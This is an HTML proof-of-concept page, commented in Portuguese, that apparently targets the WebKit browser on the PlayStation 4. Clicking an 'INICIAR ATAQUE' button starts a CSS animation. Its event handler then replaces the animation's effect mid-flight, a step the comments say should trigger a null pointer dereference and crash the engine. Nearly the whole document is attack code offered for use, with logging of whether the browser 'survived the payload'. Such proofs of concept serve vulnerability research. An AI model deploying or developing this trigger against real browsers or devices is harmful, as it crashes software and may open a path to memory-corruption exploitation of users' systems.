<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit Exploit V4 (Event Driven)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; text-align: center; }
        #log { margin-top: 20px; text-align: left; background: #111; padding: 10px; border: 1px solid #333; white-space: pre-wrap; }
        
        /* Animação simples */
        @keyframes keyframes { 
            0% { opacity: 0.1; } 
            100% { opacity: 1; } 
        }
        
        /* O segredo: animation-fill-mode para manter o estado */
        .target-anim {
            animation-name: keyframes;
            animation-duration: 50ms;
            animation-iteration-count: infinite;
            display: block;
        }
    </style>
</head>
<body>
    <h1>WebKit Sync Crash V4</h1>
    <button onclick="init()">INICIAR ATAQUE</button>
    <div id="log">Logs aparecerão aqui...</div>

    <div id="stage" style="opacity: 0">
        <object type="image/png" id="obj">
            <cite id="cite">ALVO ATIVO</cite>
            <dl hidden id="dl"></dl>
        </object>
    </div>

    <script>
        const logArea = document.getElementById('log');
        const cite = document.getElementById('cite');
        const obj = document.getElementById('obj');
        const dl = document.getElementById('dl');

        function log(msg) {
            logArea.innerText += `> ${msg}\n`;
        }

        // Função que executa o BUG
        function triggerCrash(animation) {
            log("!!! CAPTURADO !!! Executando payload...");
            
            try {
                // 1. Suja o estado do objeto pai
                obj.width = "10px";
                let trash = obj.codeBase; 

                // 2. O BUG: Remove o dono da animação trocando o efeito
                // Isso deve causar o Null Pointer Dereference no WebKit
                animation.effect = new KeyframeEffect(dl, { });
                
                log("FALHA: O navegador sobreviveu ao payload.");
            } catch (e) {
                log("ERRO JS: " + e.message);
            }
        }

        function handleAnimationStart(e) {
            log(`Evento '${e.type}' detectado!`);
            
            // Tenta pegar a animação diretamente do elemento
            // O PS4 pode precisar de um pequeno delay ou polyfill mental
            const anims = cite.getAnimations();
            
            if (anims.length > 0) {
                triggerCrash(anims[0]);
            } else {
                log("Aviso: Evento disparou, mas getAnimations() retornou vazio.");
                log("Tentando via document.getAnimations (se existir)...");
                
                // Tentativa desesperada de achar a animação globalmente
                if (document.getAnimations) {
                    const allAnims = document.getAnimations();
                    if (allAnims.length > 0) {
                        triggerCrash(allAnims[0]);
                    } else {
                        log("ERRO FATAL: Objeto de animação inacessível via JS.");
                    }
                }
            }
        }

        function init() {
            log("Iniciando...");
            
            // Adiciona ouvintes para versões modernas e antigas (WebKit prefix)
            cite.addEventListener("animationstart", handleAnimationStart);
            cite.addEventListener("webkitAnimationStart", handleAnimationStart);
            
            // Torna visível para iniciar renderização
            document.getElementById('stage').style.opacity = 1;
            
            // Adiciona a classe que contém a animação
            cite.classList.add("target-anim");
            
            // Gatilho secundário (object data) para garantir
            obj.data = "invalid_image.png";
        }

    </script>
</body>
</html>
